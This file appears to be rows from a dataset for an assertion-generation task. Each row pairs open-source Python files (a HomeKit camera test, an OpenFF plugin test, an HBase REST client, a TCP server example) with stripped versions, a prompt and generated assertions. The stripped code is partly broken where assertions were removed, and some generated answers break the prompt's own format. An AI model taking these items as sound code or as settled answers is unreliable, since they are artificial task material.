29                    model=""T8113"",
30                    manufacturer=""Anker"",
31                    sw_version=""1.6.7"",
32                    hw_version=""1.0.0"",
33                    serial_number=""A0000A000000000D"",
34                    unique_id=""00:00:00:00:00:00:aid:4"",
35                    devices=[],
36                    entities=[
37                        EntityTestInfo(
38                            entity_id=""camera.eufycam2_0000"",
39                            friendly_name=""eufyCam2-0000"",
40                            unique_id=""homekit-A0000A000000000D-aid:4"",
41                            state=""idle"",
42                        ),
43                    ],
44                ),
45            ],
46            entities=[],
47        ),
48    )
49
50    # There are multiple rtsp services, we only want to create 1
51    # camera entity per accessory, not 1 camera per service.
52    cameras_count = 0
53    for state in hass.states.async_all():
54        if state.entity_id.startswith(""camera.""):
55            cameras_count += 1
56",3397,"[[12, 'hass', '!=', None, ""the home assistant object should not be None to setup accessories""], [14, 'accessories', '!=', None, ""the accessories object should not be None after setup from file""], [15, 'accessories', '!=', None, ""the accessories object should not be None after setup test accessories""], [55, 'cameras_count', '>=', 1, ""the cameras count should be at least one after setting up all cameras""]]"
open-forcefield-group/openforcefield,"""""""
Test classes and function in module openff.toolkit.typing.engines.smirnoff.plugins
""""""
import pkg_resources
import pytest

from openff.toolkit.typing.engines.smirnoff import ForceField
from openff.toolkit.typing.engines.smirnoff.plugins import load_handler_plugins


@pytest.yield_fixture()
def mock_entry_point_plugins():
    """"""Registers a fake parameter handler and io handler with the
    entry point plugin system.

    Notes
    -----
    This function is based on `this stack overflow answer
    <https://stackoverflow.com/a/48666503/11808960>`_
    """"""

    previous_entries = pkg_resources.working_set.entries
    previous_entry_keys = pkg_resources.working_set.entry_keys
    previous_by_key = pkg_resources.working_set.by_key

    # Create a fake distribution to insert into the global working_set
    distribution = pkg_resources.Distribution(__file__)

    # Create the fake entry point definitions. These include a parameter handler
    # which is supported, and an io parameter handler which should be skipped.
    handler_entry_point = pkg_resources.EntryPoint.parse(
        ""CustomHandler = openff.toolkit.tests.plugins:CustomHandler"", dist=distribution
    )
    io_handler_entry_point = pkg_resources.EntryPoint.parse(
        ""CustomIOHandler = openff.toolkit.tests.plugins:CustomIOHandler"",
        dist=distribution,
    )

    # Add the mapping to the fake EntryPoint
    distribution._ep_map = {
        ""openff.toolkit.plugins.handlers"": {
            ""CustomHandler"": handler_entry_point,
            ""CustomIOHandler"": io_handler_entry_point,
        }
    }

    # Add the fake distribution to the global working_set
    pkg_resources.working_set.add(distribution, ""CustomHandler"")
    pkg_resources.working_set.add(distribution, ""CustomIOHandler"")

    yield

    pkg_resources.working_set.entries = previous_entries
    pkg_resources.working_set.entry_keys = previous_entry_keys
    pkg_resources.working_set.by_key = previous_by_key


def test_force_field_custom_handler(mock_entry_point_plugins):
    """"""Tests a force field can make use of a custom parameter handler registered
    through the entrypoint plugin system.
    """"""

    # Construct a simple FF which only uses the custom handler.
    force_field_contents = ""\n"".join(
        [
            ""<?xml version='1.0' encoding='ASCII'?>"",
            ""<SMIRNOFF version='0.3' aromaticity_model='OEAroModel_MDL'>"",
            ""  <CustomHandler version='0.3'></CustomHandler>"",
            ""</SMIRNOFF>"",
        ]
    )

    # An exception should be raised when plugins aren't allowed.
    with pytest.raises(KeyError) as error_info:
        ForceField(force_field_contents)

    assert (
        ""Cannot find a registered parameter handler class for tag 'CustomHandler'""
        in error_info.value.args[0]
    )

    # Otherwise the FF should be created as expected.
    force_field = ForceField(force_field_contents, load_plugins=True)

    parameter_handler = force_field.get_parameter_handler(""CustomHandler"")
    assert parameter_handler is not None
    assert parameter_handler.__class__.__name__ == ""CustomHandler""


def test_load_handler_plugins(mock_entry_point_plugins):
    """"""Tests that parameter handlers can be registered as plugins.""""""

    registered_plugins = load_handler_plugins()

    assert len(registered_plugins) == 1
    assert registered_plugins[0].__name__ == ""CustomHandler""
","
1""""""
2Test classes and function in module openff.toolkit.typing.engines.smirnoff.plugins
3""""""
4import pkg_resources
5import pytest
6
7from openff.toolkit.typing.engines.smirnoff import ForceField
8from openff.toolkit.typing.engines.smirnoff.plugins import load_handler_plugins
9
10
11@pytest.yield_fixture()
12def mock_entry_point_plugins():
13    """"""Registers a fake parameter handler and io handler with the
14    entry point plugin system.
15
16    Notes
17    -----
18    This function is based on `this stack overflow answer
19    <https://stackoverflow.com/a/48666503/11808960>`_
20    """"""
21
22    previous_entries = pkg_resources.working_set.entries
23    previous_entry_keys = pkg_resources.working_set.entry_keys
24    previous_by_key = pkg_resources.working_set.by_key
25
26    # Create a fake distribution to insert into the global working_set
27    distribution = pkg_resources.Distribution(__file__)
28
29    # Create the fake entry point definitions. These include a parameter handler
30    # which is supported, and an io parameter handler which should be skipped.
31    handler_entry_point = pkg_resources.EntryPoint.parse(
32        ""CustomHandler = openff.toolkit.tests.plugins:CustomHandler"", dist=distribution
33    )
34    io_handler_entry_point = pkg_resources.EntryPoint.parse(
35        ""CustomIOHandler = openff.toolkit.tests.plugins:CustomIOHandler"",
36        dist=distribution,
37    )
38
39    # Add the mapping to the fake EntryPoint
40    distribution._ep_map = {
41        ""openff.toolkit.plugins.handlers"": {
42            ""CustomHandler"": handler_entry_point,
43            ""CustomIOHandler"": io_handler_entry_point,
44        }
45    }
46
47    # Add the fake distribution to the global working_set
48    pkg_resources.working_set.add(distribution, ""CustomHandler"")
49    pkg_resources.working_set.add(distribution, ""CustomIOHandler"")
50
51    yield
52
53    pkg_resources.working_set.entries = previous_entries
54    pkg_resources.working_set.entry_keys = previous_entry_keys
55    pkg_resources.working_set.by_key = previous_by_key
56
57
58def test_force_field_custom_handler(mock_entry_point_plugins):
59    """"""Tests a force field can make use of a custom parameter handler registered
60    through the entrypoint plugin system.
61    """"""
62
63    # Construct a simple FF which only uses the custom handler.
64    force_field_contents = ""\n"".join(
65        [
66            ""<?xml version='1.0' encoding='ASCII'?>"",
67            ""<SMIRNOFF version='0.3' aromaticity_model='OEAroModel_MDL'>"",
68            ""  <CustomHandler version='0.3'></CustomHandler>"",
69            ""</SMIRNOFF>"",
70        ]
71    )
72
73    # An exception should be raised when plugins aren't allowed.
74    with pytest.raises(KeyError) as error_info:
75        ForceField(force_field_contents)
76
77        ""Cannot find a registered parameter handler class for tag 'CustomHandler'""
78        in error_info.value.args[0]
79    )
80
81    # Otherwise the FF should be created as expected.
82    force_field = ForceField(force_field_contents, load_plugins=True)
83
84    parameter_handler = force_field.get_parameter_handler(""CustomHandler"")
85
86
87def test_load_handler_plugins(mock_entry_point_plugins):
88    """"""Tests that parameter handlers can be registered as plugins.""""""
89
90    registered_plugins = load_handler_plugins()
91
92","[['(', '==', 'True'], ['parameter_h', '==', 'True'], ['ler', '==', 'not None'], ['parameter_h', '==', 'True'], ['ler.__class__.__name__', '==', '""CustomH'], ['ler""', '==', 'True'], ['len(registered_plugins)', '==', '1'], ['registered_plugins[0].__name__', '==', '""CustomH'], ['ler""', '==', 'True']]",5,9,1.8,0.0026501766784452,"['previous_entries', 'previous_entry_keys', 'previous_by_key', 'distribution', 'handler_entry_point', '""CustomHandler', 'io_handler_entry_point', '""CustomIOHandler', 'distribution._ep_map', 'pkg_resources.working_set.entries', 'pkg_resources.working_set.entry_keys', 'pkg_resources.working_set.by_key', 'mock_entry_point_plugins', 'force_field_contents', 'force_field', 'parameter_handler', 'registered_plugins']",17,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['previous_entries', 'previous_entry_keys', 'previous_by_key', 'distribution', 'handler_entry_point', '""CustomHandler', 'io_handler_entry_point', '""CustomIOHandler', 'distribution._ep_map', 'pkg_resources.working_set.entries', 'pkg_resources.working_set.entry_keys', 'pkg_resources.working_set.by_key', 'mock_entry_point_plugins', 'force_field_contents', 'force_field', 'parameter_handler', 'registered_plugins']
*Code:

1""""""
2Test classes and function in module openff.toolkit.typing.engines.smirnoff.plugins
3""""""
4import pkg_resources
5import pytest
6
7from openff.toolkit.typing.engines.smirnoff import ForceField
8from openff.toolkit.typing.engines.smirnoff.plugins import load_handler_plugins
9
10
11@pytest.yield_fixture()
12def mock_entry_point_plugins():
13    """"""Registers a fake parameter handler and io handler with the
14    entry point plugin system.
15
16    Notes
17    -----
18    This function is based on `this stack overflow answer
19    <https://stackoverflow.com/a/48666503/11808960>`_
20    """"""
21
22    previous_entries = pkg_resources.working_set.entries
23    previous_entry_keys = pkg_resources.working_set.entry_keys
24    previous_by_key = pkg_resources.working_set.by_key
25
26    # Create a fake distribution to insert into the global working_set
27    distribution = pkg_resources.Distribution(__file__)
28
29    # Create the fake entry point definitions. These include a parameter handler
30    # which is supported, and an io parameter handler which should be skipped.
31    handler_entry_point = pkg_resources.EntryPoint.parse(
32        ""CustomHandler = openff.toolkit.tests.plugins:CustomHandler"", dist=distribution
33    )
34    io_handler_entry_point = pkg_resources.EntryPoint.parse(
35        ""CustomIOHandler = openff.toolkit.tests.plugins:CustomIOHandler"",
36        dist=distribution,
37    )
38
39    # Add the mapping to the fake EntryPoint
40    distribution._ep_map = {
41        ""openff.toolkit.plugins.handlers"": {
42            ""CustomHandler"": handler_entry_point,
43            ""CustomIOHandler"": io_handler_entry_point,
44        }
45    }
46
47    # Add the fake distribution to the global working_set
48    pkg_resources.working_set.add(distribution, ""CustomHandler"")
49    pkg_resources.working_set.add(distribution, ""CustomIOHandler"")
50
51    yield
52
53    pkg_resources.working_set.entries = previous_entries
54    pkg_resources.working_set.entry_keys = previous_entry_keys
55    pkg_resources.working_set.by_key = previous_by_key
56
57
58def test_force_field_custom_handler(mock_entry_point_plugins):
59    """"""Tests a force field can make use of a custom parameter handler registered
60    through the entrypoint plugin system.
61    """"""
62
63    # Construct a simple FF which only uses the custom handler.
64    force_field_contents = ""\n"".join(
65        [
66            ""<?xml version='1.0' encoding='ASCII'?>"",
67            ""<SMIRNOFF version='0.3' aromaticity_model='OEAroModel_MDL'>"",
68            ""  <CustomHandler version='0.3'></CustomHandler>"",
69            ""</SMIRNOFF>"",
70        ]
71    )
72
73    # An exception should be raised when plugins aren't allowed.
74    with pytest.raises(KeyError) as error_info:
75        ForceField(force_field_contents)
76
77        ""Cannot find a registered parameter handler class for tag 'CustomHandler'""
78        in error_info.value.args[0]
79    )
80
81    # Otherwise the FF should be created as expected.
82    force_field = ForceField(force_field_contents, load_plugins=True)
83
84    parameter_handler = force_field.get_parameter_handler(""CustomHandler"")
85
86
87def test_load_handler_plugins(mock_entry_point_plugins):
88    """"""Tests that parameter handlers can be registered as plugins.""""""
89
90    registered_plugins = load_handler_plugins()
91
92",5142,"[[13, 'previous_entries', '!=', None, ""previous_entries should not be None prior to testing""],
[14, 'previous_entry_keys', '!=', None, ""previous_entry_keys should not be None prior to testing""],
[15, 'previous_by_key', '!=', None, ""previous_by_key should not be None prior to testing""],
[33, 'handler_entry_point', '!=', None, ""handler_entry_point should be created properly""],
[37, 'io_handler_entry_point', '!=', None, ""io_handler_entry_point should be created properly""],
[72, 'force_field_contents', '!=', None, ""force_field_contents should be a properly initialized string""],
[83, 'force_field', '!=', None, ""force_field should be properly created with provided contents"" ],
[85, 'parameter_handler', '!=', None, ""parameter_handler should be properly retrieved from force_field""],
[91, 'registered_plugins', '!=', None, ""registered_plugins should be properly populated after loading the plugins""],]"
nlpraveennl/cloud-bigtable-examples,"#!/usr/bin/env python
#
# Copyright 2015 Google Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import base64
from collections import OrderedDict
import json
import requests


class HbaseRestClient(object):
    """""" This class provides a simpler interface to using the HBase REST
    API. It includes some common needs such as base64 encoding/decoding
    and assembling values into the appropriate data structures.
    """"""

    def __init__(self, base_url, table_name):
        """""" Creates an instance of an Hbase REST client.
        :param base_url: The hostname and port of the Hbase REST server.
        e.g 'http://130.211.170.242:8080'
        :param table_name: The name of the table
        :return:
        """"""
        assert (len(table_name) > 0)
        self.base_url = base_url
        self.table_name = table_name

    def put_row(self, row_key, column, value):
        """""" Puts a value into an HBase cell via REST
        This puts a value in the fully qualified column name. This assumes
        that the table has already been created with the column family in its
        schema. If it doesn't exist, you can use create_table() to doso.
        :param row_key: The row we want to put a value into.
        :param column: The fully qualified column (e.g.
        my_column_family:content)
        :param value: A string representing the sequence of bytes we want to
        put into the cell
        :return: None
        """"""
        row_key_encoded = base64.b64encode(row_key)
        column_encoded = base64.b64encode(column)
        value_encoded = base64.b64encode(value)

        cell = OrderedDict([
            (""key"", row_key_encoded),
            (""Cell"", [{""column"": column_encoded, ""$"": value_encoded}])
        ])
        rows = [cell]
        json_output = {""Row"": rows}
        r = requests.post(self.base_url + ""/"" + self.table_name + ""/"" + row_key,
                          data=json.dumps(json_output),
                          headers={
                              ""Content-Type"": ""application/json"",
                              ""Accept"": ""application/json"",
                          }
                          )
        if r.status_code != 200:
            print ""got status code %d when putting"" % r.status_code

    def get_row(self, row_key):
        """""" Returns a value from the first column in a row.
        :param row_key: The row to return the value from
        :return: The bytes in the cell represented as a Python string.
        """"""
        request = requests.get(self.base_url + ""/"" + self.table_name + ""/"" +
                               row_key,
                               headers={""Accept"": ""application/json""})
        if request.status_code != 200:
            return None
        text = json.loads(request.text)
        value = base64.b64decode(text['Row'][0]['Cell'][0]['$'])
        return value

    def delete(self, row_key):
        """""" Deletes a row
        :param row_key: The row key of the row to delete
        :return: None
        """"""
        requests.delete(self.base_url + ""/"" + self.table_name + ""/"" + row_key)

    def create_table(self, table_name, column_family):
        """""" Creates a table with a single column family.

        It's safe to call if the table already exists, it will just fail
        silently.
        :param table_name: The name of the
        :param column_family: The column family to create the table with.
        :return: None
        """"""
        json_output = {""name"": table_name,
                       ""ColumnSchema"": [{""name"": column_family}]}
        requests.post(self.base_url + '/' + table_name + '/schema',
                      data=json.dumps(json_output),
                      headers={
                          ""Content-Type"": ""application/json"",
                          ""Accept"": ""application/json""
                      })

    def get_tables(self):
        """""" Returns a list of the tables in Hbase
        :return: A list of the table names as strings
        """"""
        r = requests.get(self.base_url)
        tables = r.text.split('\n')
        return tables
","
1#!/usr/bin/env python
2#
3# Copyright 2015 Google Inc.
4#
5# Licensed under the Apache License, Version 2.0 (the ""License"");
6# you may not use this file except in compliance with the License.
7# You may obtain a copy of the License at
8#
9#     http://www.apache.org/licenses/LICENSE-2.0
10#
11# Unless required by applicable law or agreed to in writing, software
12# distributed under the License is distributed on an ""AS IS"" BASIS,
13# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
14# See the License for the specific language governing permissions and
15# limitations under the License.
16
17import base64
18from collections import OrderedDict
19import json
20import requests
21
22
23class HbaseRestClient(object):
24    """""" This class provides a simpler interface to using the HBase REST
25    API. It includes some common needs such as base64 encoding/decoding
26    and assembling values into the appropriate data structures.
27    """"""
28
29    def __init__(self, base_url, table_name):
30        """""" Creates an instance of an Hbase REST client.
31        :param base_url: The hostname and port of the Hbase REST server.
32        e.g 'http://130.211.170.242:8080'
33        :param table_name: The name of the table
34        :return:
35        """"""
36        self.base_url = base_url
37        self.table_name = table_name
38
39    def put_row(self, row_key, column, value):
40        """""" Puts a value into an HBase cell via REST
41        This puts a value in the fully qualified column name. This assumes
42        that the table has already been created with the column family in its
43        schema. If it doesn't exist, you can use create_table() to doso.
44        :param row_key: The row we want to put a value into.
45        :param column: The fully qualified column (e.g.
46        my_column_family:content)
47        :param value: A string representing the sequence of bytes we want to
48        put into the cell
49        :return: None
50        """"""
51        row_key_encoded = base64.b64encode(row_key)
52        column_encoded = base64.b64encode(column)
53        value_encoded = base64.b64encode(value)
54
55        cell = OrderedDict([
56            (""key"", row_key_encoded),
57            (""Cell"", [{""column"": column_encoded, ""$"": value_encoded}])
58        ])
59        rows = [cell]
60        json_output = {""Row"": rows}
61        r = requests.post(self.base_url + ""/"" + self.table_name + ""/"" + row_key,
62                          data=json.dumps(json_output),
63                          headers={
64                              ""Content-Type"": ""application/json"",
65                              ""Accept"": ""application/json"",
66                          }
67                          )
68        if r.status_code != 200:
69            print ""got status code %d when putting"" % r.status_code
70
71    def get_row(self, row_key):
72        """""" Returns a value from the first column in a row.
73        :param row_key: The row to return the value from
74        :return: The bytes in the cell represented as a Python string.
75        """"""
76        request = requests.get(self.base_url + ""/"" + self.table_name + ""/"" +
77                               row_key,
78                               headers={""Accept"": ""application/json""})
79        if request.status_code != 200:
80            return None
81        text = json.loads(request.text)
82        value = base64.b64decode(text['Row'][0]['Cell'][0]['$'])
83        return value
84
85    def delete(self, row_key):
86        """""" Deletes a row
87        :param row_key: The row key of the row to delete
88        :return: None
89        """"""
90        requests.delete(self.base_url + ""/"" + self.table_name + ""/"" + row_key)
91
92    def create_table(self, table_name, column_family):
93        """""" Creates a table with a single column family.
94
95        It's safe to call if the table already exists, it will just fail
96        silently.
97        :param table_name: The name of the
98        :param column_family: The column family to create the table with.
99        :return: None
100        """"""
101        json_output = {""name"": table_name,
102                       ""ColumnSchema"": [{""name"": column_family}]}
103        requests.post(self.base_url + '/' + table_name + '/schema',
104                      data=json.dumps(json_output),
105                      headers={
106                          ""Content-Type"": ""application/json"",
107                          ""Accept"": ""application/json""
108                      })
109
110    def get_tables(self):
111        """""" Returns a list of the tables in Hbase
112        :return: A list of the table names as strings
113        """"""
114        r = requests.get(self.base_url)
115        tables = r.text.split('\n')
116        return tables
117","[['(len(table_name)', '>', '0)']]",1,1,1.0,0.0002174858634188,"['base_url', 'table_name', 'self.base_url', 'self.table_name', 'row_key', 'column', 'value', 'row_key_encoded', 'column_encoded', 'value_encoded', 'cell', 'rows', 'json_output', 'r', 'request', 'text', 'column_family', 'tables']",18,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['base_url', 'table_name', 'self.base_url', 'self.table_name', 'row_key', 'column', 'value', 'row_key_encoded', 'column_encoded', 'value_encoded', 'cell', 'rows', 'json_output', 'r', 'request', 'text', 'column_family', 'tables']
*Code:

1#!/usr/bin/env python
2#
3# Copyright 2015 Google Inc.
4#
5# Licensed under the Apache License, Version 2.0 (the ""License"");
6# you may not use this file except in compliance with the License.
7# You may obtain a copy of the License at
8#
9#     http://www.apache.org/licenses/LICENSE-2.0
10#
11# Unless required by applicable law or agreed to in writing, software
12# distributed under the License is distributed on an ""AS IS"" BASIS,
13# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
14# See the License for the specific language governing permissions and
15# limitations under the License.
16
17import base64
18from collections import OrderedDict
19import json
20import requests
21
22
23class HbaseRestClient(object):
24    """""" This class provides a simpler interface to using the HBase REST
25    API. It includes some common needs such as base64 encoding/decoding
26    and assembling values into the appropriate data structures.
27    """"""
28
29    def __init__(self, base_url, table_name):
30        """""" Creates an instance of an Hbase REST client.
31        :param base_url: The hostname and port of the Hbase REST server.
32        e.g 'http://130.211.170.242:8080'
33        :param table_name: The name of the table
34        :return:
35        """"""
36        self.base_url = base_url
37        self.table_name = table_name
38
39    def put_row(self, row_key, column, value):
40        """""" Puts a value into an HBase cell via REST
41        This puts a value in the fully qualified column name. This assumes
42        that the table has already been created with the column family in its
43        schema. If it doesn't exist, you can use create_table() to doso.
44        :param row_key: The row we want to put a value into.
45        :param column: The fully qualified column (e.g.
46        my_column_family:content)
47        :param value: A string representing the sequence of bytes we want to
48        put into the cell
49        :return: None
50        """"""
51        row_key_encoded = base64.b64encode(row_key)
52        column_encoded = base64.b64encode(column)
53        value_encoded = base64.b64encode(value)
54
55        cell = OrderedDict([
56            (""key"", row_key_encoded),
57            (""Cell"", [{""column"": column_encoded, ""$"": value_encoded}])
58        ])
59        rows = [cell]
60        json_output = {""Row"": rows}
61        r = requests.post(self.base_url + ""/"" + self.table_name + ""/"" + row_key,
62                          data=json.dumps(json_output),
63                          headers={
64                              ""Content-Type"": ""application/json"",
65                              ""Accept"": ""application/json"",
66                          }
67                          )
68        if r.status_code != 200:
69            print ""got status code %d when putting"" % r.status_code
70
71    def get_row(self, row_key):
72        """""" Returns a value from the first column in a row.
73        :param row_key: The row to return the value from
74        :return: The bytes in the cell represented as a Python string.
75        """"""
76        request = requests.get(self.base_url + ""/"" + self.table_name + ""/"" +
77                               row_key,
78                               headers={""Accept"": ""application/json""})
79        if request.status_code != 200:
80            return None
81        text = json.loads(request.text)
82        value = base64.b64decode(text['Row'][0]['Cell'][0]['$'])
83        return value
84
85    def delete(self, row_key):
86        """""" Deletes a row
87        :param row_key: The row key of the row to delete
88        :return: None
89        """"""
90        requests.delete(self.base_url + ""/"" + self.table_name + ""/"" + row_key)
91
92    def create_table(self, table_name, column_family):
93        """""" Creates a table with a single column family.
94
95        It's safe to call if the table already exists, it will just fail
96        silently.
97        :param table_name: The name of the
98        :param column_family: The column family to create the table with.
99        :return: None
100        """"""
101        json_output = {""name"": table_name,
102                       ""ColumnSchema"": [{""name"": column_family}]}
103        requests.post(self.base_url + '/' + table_name + '/schema',
104                      data=json.dumps(json_output),
105                      headers={
106                          ""Content-Type"": ""application/json"",
107                          ""Accept"": ""application/json""
108                      })
109
110    def get_tables(self):
111        """""" Returns a list of the tables in Hbase
112        :return: A list of the table names as strings
113        """"""
114        r = requests.get(self.base_url)
115        tables = r.text.split('\n')
116        return tables
117",6413,"[[29, 'base_url', '!=', '', ""Base URL should not be empty""],
[29, 'table_name', '!=', '', ""Table name should not be empty""],
[39, 'row_key', '!=', '', ""Row key for put_row operation should not be empty""],
[39, 'column', '!=', '', ""Column for put_row operation should not be empty""],
[39, 'value', '!=', '', ""Value for put_row operation should not be empty""],
[71, 'row_key', '!=', '', ""Row key for get_row operation should not be empty""],
[85, 'row_key', '!=', '', ""Row key for delete operation should not be empty""],
[92, 'table_name', '!=', '', ""Table name for table creation should not be empty""],
[92, 'column_family', '!=', '', ""Column family for table creation should not be empty""]]"
overcastcloud/trollius,"""""""
Example of a simple TCP server that is written in (mostly) coroutine
style and uses asyncio.streams.start_server() and
asyncio.streams.open_connection().

Note that running this example starts both the TCP server and client
in the same process.  It listens on port 12345 on 127.0.0.1, so it will
fail if this port is currently in use.
""""""

from __future__ import print_function
import sys
import trollius as asyncio
import asyncio.streams
from trollius import From, Return


class MyServer:
    """"""
    This is just an example of how a TCP server might be potentially
    structured.  This class has basically 3 methods: start the server,
    handle a client, and stop the server.

    Note that you don't have to follow this structure, it is really
    just an example or possible starting point.
    """"""

    def __init__(self):
        self.server = None # encapsulates the server sockets

        # this keeps track of all the clients that connected to our
        # server.  It can be useful in some cases, for instance to
        # kill client connections or to broadcast some data to all
        # clients...
        self.clients = {} # task -> (reader, writer)

    def _accept_client(self, client_reader, client_writer):
        """"""
        This method accepts a new client connection and creates a Task
        to handle this client.  self.clients is updated to keep track
        of the new client.
        """"""

        # start a new Task to handle this specific client connection
        task = asyncio.Task(self._handle_client(client_reader, client_writer))
        self.clients[task] = (client_reader, client_writer)

        def client_done(task):
            print(""client task done:"", task, file=sys.stderr)
            del self.clients[task]

        task.add_done_callback(client_done)

    @asyncio.coroutine
    def _handle_client(self, client_reader, client_writer):
        """"""
        This method actually does the work to handle the requests for
        a specific client.  The protocol is line oriented, so there is
        a main loop that reads a line with a request and then sends
        out one or more lines back to the client with the result.
        """"""
        while True:
            data = (yield From(client_reader.readline()))
            data = data.decode(""utf-8"")
            if not data: # an empty string means the client disconnected
                break
            parts = data.rstrip().split(' ')
            cmd = parts[0]
            args = parts[1:]
            if cmd == 'add':
                arg1 = float(args[0])
                arg2 = float(args[1])
                retval = arg1 + arg2
                client_writer.write(""{0!r}\n"".format(retval).encode(""utf-8""))
            elif cmd == 'repeat':
                times = int(args[0])
                msg = args[1]
                client_writer.write(""begin\n"".encode(""utf-8""))
                for idx in range(times):
                    client_writer.write(""{0}. {1}\n"".format(idx+1, msg)
                                        .encode(""utf-8""))
                client_writer.write(""end\n"".encode(""utf-8""))
            else:
                print(""Bad command {0!r}"".format(data), file=sys.stderr)

            # This enables us to have flow control in our connection.
            yield From(client_writer.drain())

    def start(self, loop):
        """"""
        Starts the TCP server, so that it listens on port 12345.

        For each client that connects, the accept_client method gets
        called.  This method runs the loop until the server sockets
        are ready to accept connections.
        """"""
        self.server = loop.run_until_complete(
            asyncio.streams.start_server(self._accept_client,
                                         '127.0.0.1', 12345,
                                         loop=loop))

    def stop(self, loop):
        """"""
        Stops the TCP server, i.e. closes the listening socket(s).

        This method runs the loop until the server sockets are closed.
        """"""
        if self.server is not None:
            self.server.close()
            loop.run_until_complete(self.server.wait_closed())
            self.server = None


def main():
    loop = asyncio.get_event_loop()

    # creates a server and starts listening to TCP connections
    server = MyServer()
    server.start(loop)

    @asyncio.coroutine
    def client():
        reader, writer = yield From(asyncio.streams.open_connection(
            '127.0.0.1', 12345, loop=loop))

        def send(msg):
            print(""> "" + msg)
            writer.write((msg + '\n').encode(""utf-8""))

        def recv():
            msgback = (yield From(reader.readline()))
            msgback = msgback.decode(""utf-8"").rstrip()
            print(""< "" + msgback)
            raise Return(msgback)

        # send a line
        send(""add 1 2"")
        msg = yield From(recv())

        send(""repeat 5 hello"")
        msg = yield From(recv())
        assert msg == 'begin'
        while True:
            msg = yield From(recv())
            if msg == 'end':
                break

        writer.close()
        yield From(asyncio.sleep(0.5))

    # creates a client and connects to our server
    try:
        loop.run_until_complete(client())
        server.stop(loop)
    finally:
        loop.close()


if __name__ == '__main__':
    main()
","
1""""""
2Example of a simple TCP server that is written in (mostly) coroutine
3style and uses asyncio.streams.start_server() and
4asyncio.streams.open_connection().
5
6Note that running this example starts both the TCP server and client
7in the same process.  It listens on port 12345 on 127.0.0.1, so it will
8fail if this port is currently in use.
9""""""
10
11from __future__ import print_function
12import sys
13import trollius as asyncio
14import asyncio.streams
15from trollius import From, Return
16
17
18class MyServer:
19    """"""
20    This is just an example of how a TCP server might be potentially
21    structured.  This class has basically 3 methods: start the server,
22    handle a client, and stop the server.
23
24    Note that you don't have to follow this structure, it is really
25    just an example or possible starting point.
26    """"""
27
28    def __init__(self):
29        self.server = None # encapsulates the server sockets
30
31        # this keeps track of all the clients that connected to our
32        # server.  It can be useful in some cases, for instance to
33        # kill client connections or to broadcast some data to all
34        # clients...
35        self.clients = {} # task -> (reader, writer)
36
37    def _accept_client(self, client_reader, client_writer):
38        """"""
39        This method accepts a new client connection and creates a Task
40        to handle this client.  self.clients is updated to keep track
41        of the new client.
42        """"""
43
44        # start a new Task to handle this specific client connection
45        task = asyncio.Task(self._handle_client(client_reader, client_writer))
46        self.clients[task] = (client_reader, client_writer)
47
48        def client_done(task):
49            print(""client task done:"", task, file=sys.stderr)
50            del self.clients[task]
51
52        task.add_done_callback(client_done)
53
54    @asyncio.coroutine
55    def _handle_client(self, client_reader, client_writer):
56        """"""
57        This method actually does the work to handle the requests for
58        a specific client.  The protocol is line oriented, so there is
59        a main loop that reads a line with a request and then sends
60        out one or more lines back to the client with the result.
61        """"""
62        while True:
63            data = (yield From(client_reader.readline()))
64            data = data.decode(""utf-8"")
65            if not data: # an empty string means the client disconnected
66                break
67            parts = data.rstrip().split(' ')
68            cmd = parts[0]
69            args = parts[1:]
70            if cmd == 'add':
71                arg1 = float(args[0])
72                arg2 = float(args[1])
73                retval = arg1 + arg2
74                client_writer.write(""{0!r}\n"".format(retval).encode(""utf-8""))
75            elif cmd == 'repeat':
76                times = int(args[0])
77                msg = args[1]
78                client_writer.write(""begin\n"".encode(""utf-8""))
79                for idx in range(times):
80                    client_writer.write(""{0}. {1}\n"".format(idx+1, msg)
81                                        .encode(""utf-8""))
82                client_writer.write(""end\n"".encode(""utf-8""))
83            else:
84                print(""Bad command {0!r}"".format(data), file=sys.stderr)
85
86            # This enables us to have flow control in our connection.
87            yield From(client_writer.drain())
88
89    def start(self, loop):
90        """"""
91        Starts the TCP server, so that it listens on port 12345.
92
93        For each client that connects, the accept_client method gets
